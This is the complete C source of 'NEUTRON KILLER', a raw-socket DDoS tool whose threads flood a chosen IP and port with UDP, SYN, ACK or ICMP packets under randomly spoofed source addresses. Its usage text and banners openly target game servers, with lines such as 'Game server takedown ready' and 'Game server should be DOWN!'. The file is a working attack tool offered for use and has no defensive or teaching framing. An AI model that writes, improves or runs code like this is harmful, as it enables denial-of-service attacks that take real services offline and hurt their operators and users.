/*
 * NEUTRON KILLER - High Performance DDoS Tool (1M-2M PPS)
 * Compile: gcc -O3 -march=native -pthread -o neutron_killer neutron_killer.c
 * Usage: sudo ./neutron_killer <IP> <PORT> <DURATION> <THREADS> <METHOD>
 * 
 * DURATION: 0 = continuous
 * THREADS: 8=1M PPS, 12=1.5M PPS, 16=2M PPS
 * METHOD: 0=UDP, 1=SYN, 2=ACK, 3=ICMP, 4=ALL
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <sched.h>

#define PACKET_SIZE 1500
#define MAX_THREADS 64
#define BATCH_SIZE 1024

volatile int running = 1;
unsigned int target_ip;
int target_port;
int duration_seconds;
int threads_count;
int attack_method;
unsigned long long total_packets = 0;
unsigned long long current_pps = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
time_t attack_start_time;

struct {
    char udp_packet[PACKET_SIZE];
    int udp_len;
    char syn_packet[PACKET_SIZE];
    int syn_len;
    char ack_packet[PACKET_SIZE];
    int ack_len;
    char icmp_packet[PACKET_SIZE];
    int icmp_len;
} templates;

unsigned short in_cksum(unsigned short *addr, int len) {
    register int sum = 0;
    unsigned short answer = 0;
    while (len > 1) { sum += *addr++; len -= 2; }
    if (len == 1) { *(unsigned char *)(&answer) = *(unsigned char *)addr; sum += answer; }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void init_packet_templates() {
    // UDP Template
    struct iphdr *ip_udp = (struct iphdr *)templates.udp_packet;
    struct udphdr *udp = (struct udphdr *)(templates.udp_packet + sizeof(struct iphdr));
    ip_udp->ihl = 5; ip_udp->version = 4; ip_udp->tos = 0;
    ip_udp->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 1400);
    ip_udp->frag_off = 0; ip_udp->ttl = 255; ip_udp->protocol = IPPROTO_UDP;
    ip_udp->daddr = target_ip;
    udp->dest = htons(target_port);
    udp->len = htons(sizeof(struct udphdr) + 1400);
    for (int i = 0; i < 1400; i++) templates.udp_packet[sizeof(struct iphdr) + sizeof(struct udphdr) + i] = rand() % 256;
    templates.udp_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1400;
    
    // SYN Template
    struct iphdr *ip_syn = (struct iphdr *)templates.syn_packet;
    struct tcphdr *tcp_syn = (struct tcphdr *)(templates.syn_packet + sizeof(struct iphdr));
    ip_syn->ihl = 5; ip_syn->version = 4; ip_syn->tos = 0;
    ip_syn->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_syn->frag_off = 0; ip_syn->ttl = 255; ip_syn->protocol = IPPROTO_TCP;
    ip_syn->daddr = target_ip;
    tcp_syn->dest = htons(target_port); tcp_syn->doff = 5; tcp_syn->syn = 1; tcp_syn->window = htons(65535);
    templates.syn_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    // ACK Template
    struct iphdr *ip_ack = (struct iphdr *)templates.ack_packet;
    struct tcphdr *tcp_ack = (struct tcphdr *)(templates.ack_packet + sizeof(struct iphdr));
    ip_ack->ihl = 5; ip_ack->version = 4; ip_ack->tos = 0;
    ip_ack->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_ack->frag_off = 0; ip_ack->ttl = 255; ip_ack->protocol = IPPROTO_TCP;
    ip_ack->daddr = target_ip;
    tcp_ack->dest = htons(target_port); tcp_ack->doff = 5; tcp_ack->ack = 1; tcp_ack->window = htons(65535);
    templates.ack_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    // ICMP Template
    struct iphdr *ip_icmp = (struct iphdr *)templates.icmp_packet;
    struct icmphdr *icmp = (struct icmphdr *)(templates.icmp_packet + sizeof(struct iphdr));
    ip_icmp->ihl = 5; ip_icmp->version = 4; ip_icmp->tos = 0;
    ip_icmp->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 1024);
    ip_icmp->frag_off = 0; ip_icmp->ttl = 255; ip_icmp->protocol = IPPROTO_ICMP;
    ip_icmp->daddr = target_ip;
    icmp->type = ICMP_ECHO; icmp->code = 0;
    templates.icmp_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1024;
}

void *send_flood(void *arg) {
    int thread_id = *(int *)arg;
    int sock; struct sockaddr_in target; char packet_buffer[PACKET_SIZE]; int packet_len;
    struct iphdr *ip; unsigned int src_ip_base; unsigned short src_port_base;
    
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(thread_id % 8, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    struct sched_param param; param.sched_priority = sched_get_priority_max(SCHED_RR);
    pthread_setschedparam(pthread_self(), SCHED_RR, &param);
    
    if (attack_method == 0 || attack_method == 4) sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    else if (attack_method == 1 || attack_method == 2) sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    else sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    
    int one = 1; setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int buffer_size = 1024 * 1024 * 16; setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    target.sin_family = AF_INET; target.sin_addr.s_addr = target_ip;
    srand(time(NULL) ^ (thread_id * 13371337));
    src_ip_base = (rand() % 0xFFFFFF00) + 1; src_port_base = rand() % 65535;
    
    while (running) {
        for (int batch = 0; batch < BATCH_SIZE; batch++) {
            if (attack_method == 0 || attack_method == 4) {
                ip = (struct iphdr *)templates.udp_packet;
                ip->saddr = htonl(src_ip_base + (rand() % 0xFFFFFF));
                ip->id = rand() % 65535; ip->check = 0;
                ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
                memcpy(packet_buffer, templates.udp_packet, templates.udp_len);
                packet_len = templates.udp_len;
                struct udphdr *udp = (struct udphdr *)(packet_buffer + sizeof(struct iphdr));
                udp->source = htons(src_port_base + (rand() % 65535));
            } else if (attack_method == 1) {
                ip = (struct iphdr *)templates.syn_packet;
                ip->saddr = htonl(src_ip_base + (rand() % 0xFFFFFF));
                ip->id = rand() % 65535; ip->check = 0;
                ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
                memcpy(packet_buffer, templates.syn_packet, templates.syn_len);
                packet_len = templates.syn_len;
                struct tcphdr *tcp = (struct tcphdr *)(packet_buffer + sizeof(struct iphdr));
                tcp->source = htons(src_port_base + (rand() % 65535));
                tcp->seq = rand();
            } else if (attack_method == 2) {
                ip = (struct iphdr *)templates.ack_packet;
                ip->saddr = htonl(src_ip_base + (rand() % 0xFFFFFF));
                ip->id = rand() % 65535; ip->check = 0;
                ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
                memcpy(packet_buffer, templates.ack_packet, templates.ack_len);
                packet_len = templates.ack_len;
                struct tcphdr *tcp = (struct tcphdr *)(packet_buffer + sizeof(struct iphdr));
                tcp->source = htons(src_port_base + (rand() % 65535));
                tcp->ack_seq = rand();
            } else {
                ip = (struct iphdr *)templates.icmp_packet;
                ip->saddr = htonl(src_ip_base + (rand() % 0xFFFFFF));
                ip->id = rand() % 65535; ip->check = 0;
                ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
                memcpy(packet_buffer, templates.icmp_packet, templates.icmp_len);
                packet_len = templates.icmp_len;
            }
            sendto(sock, packet_buffer, packet_len, 0, (struct sockaddr *)&target, sizeof(target));
        }
        pthread_mutex_lock(&stats_mutex);
        total_packets += BATCH_SIZE;
        pthread_mutex_unlock(&stats_mutex);
    }
    close(sock);
    return NULL;
}

void *monitor_progress(void *arg) {
    unsigned long long last_packets = 0;
    while (running) {
        sleep(1);
        time_t now = time(NULL);
        int elapsed = now - attack_start_time;
        pthread_mutex_lock(&stats_mutex);
        unsigned long long current = total_packets;
        pthread_mutex_unlock(&stats_mutex);
        current_pps = current - last_packets;
        last_packets = current;
        
        if (duration_seconds == 0) {
            printf("\r[🔥] PPS: %'llu | Total: %'llu | Bandwidth: %.1f Gbps | Time: %ds (CONTINUOUS)", 
                   current_pps, current, current_pps * 0.0014, elapsed);
        } else {
            printf("\r[🔥] PPS: %'llu | Total: %'llu | Bandwidth: %.1f Gbps | Time: %ds/%ds", 
                   current_pps, current, current_pps * 0.0014, elapsed, duration_seconds);
        }
        fflush(stdout);
        
        if (duration_seconds > 0 && elapsed >= duration_seconds) {
            printf("\n\n[✅] Attack completed!\n");
            running = 0;
            break;
        }
    }
    return NULL;
}

void signal_handler(int sig) { running = 0; }

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("\n🔥 NEUTRON KILLER - High Performance DDoS Tool (1M-2M PPS)\n");
        printf("Usage: sudo %s <IP> <PORT> <DURATION> <THREADS> <METHOD>\n\n", argv[0]);
        printf("DURATION: 0 = continuous, >0 = seconds\n");
        printf("THREADS: 8=1M PPS, 12=1.5M PPS, 16=2M PPS, 24=3M PPS\n");
        printf("METHOD: 0=UDP, 1=SYN, 2=ACK, 3=ICMP, 4=ALL\n");
        printf("Example: sudo %s 1.2.3.4 27015 45 12 0\n", argv[0]);
        printf("\nGame Server Takedown:\n");
        printf("  Minimum: 8 threads (1M PPS, ~4 Gbps)\n");
        printf("  Optimal: 12 threads (1.5M PPS, ~6 Gbps)\n");
        printf("  Maximum: 16 threads (2M PPS, ~8 Gbps)\n");
        return 1;
    }
    
    target_ip = inet_addr(argv[1]); target_port = atoi(argv[2]);
    duration_seconds = atoi(argv[3]); threads_count = atoi(argv[4]);
    attack_method = atoi(argv[5]);
    
    if (threads_count > MAX_THREADS) threads_count = MAX_THREADS;
    if (geteuid() != 0) { printf("[❌] Run with sudo!\n"); return 1; }
    
    signal(SIGINT, signal_handler);
    attack_start_time = time(NULL);
    srand(time(NULL));
    init_packet_templates();
    
    int estimated_pps = threads_count * 125000;
    float estimated_bandwidth = estimated_pps * 0.0014;
    
    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
    printf("║     🔥 NEUTRON KILLER - ATTACK CONFIGURATION 🔥              ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    printf("[🎯] Target: %s:%d\n", argv[1], target_port);
    printf("[⏱️] Duration: %s\n", duration_seconds == 0 ? "CONTINUOUS" : (char[20]){0});
    if (duration_seconds > 0) printf("           %d seconds\n", duration_seconds);
    printf("[🧵] Threads: %d\n", threads_count);
    printf("[📊] Estimated PPS: ~%d\n", estimated_pps);
    printf("[📡] Estimated Bandwidth: ~%.1f Gbps\n", estimated_bandwidth);
    printf("[💀] Method: %s\n", 
           attack_method == 0 ? "UDP" : attack_method == 1 ? "SYN" : attack_method == 2 ? "ACK" : attack_method == 3 ? "ICMP" : "ALL");
    
    if (estimated_pps >= 1000000) {
        printf("[✅] 1M+ PPS Achievable! Game server takedown ready.\n");
    } else {
        printf("[⚠️] PPS below 1M. Increase threads.\n");
    }
    
    printf("\n[🔥] Attack starting... (Press Ctrl+C to stop)\n\n");
    
    pthread_t threads[threads_count]; int thread_ids[threads_count];
    for (int i = 0; i < threads_count; i++) { thread_ids[i] = i; pthread_create(&threads[i], NULL, send_flood, &thread_ids[i]); }
    pthread_t monitor_thread; pthread_create(&monitor_thread, NULL, monitor_progress, NULL);
    pthread_join(monitor_thread, NULL);
    running = 0;
    for (int i = 0; i < threads_count; i++) pthread_join(threads[i], NULL);
    
    printf("\n\n╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                    ATTACK COMPLETED                           ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("[📊] Total packets: %'llu\n", total_packets);
    if (duration_seconds > 0) {
        printf("[⚡] Average PPS: %'llu\n", total_packets / duration_seconds);
        if (total_packets / duration_seconds >= 1000000)
            printf("[🏆] 1M+ PPS ACHIEVED! Game server should be DOWN!\n");
    }
    return 0;
}
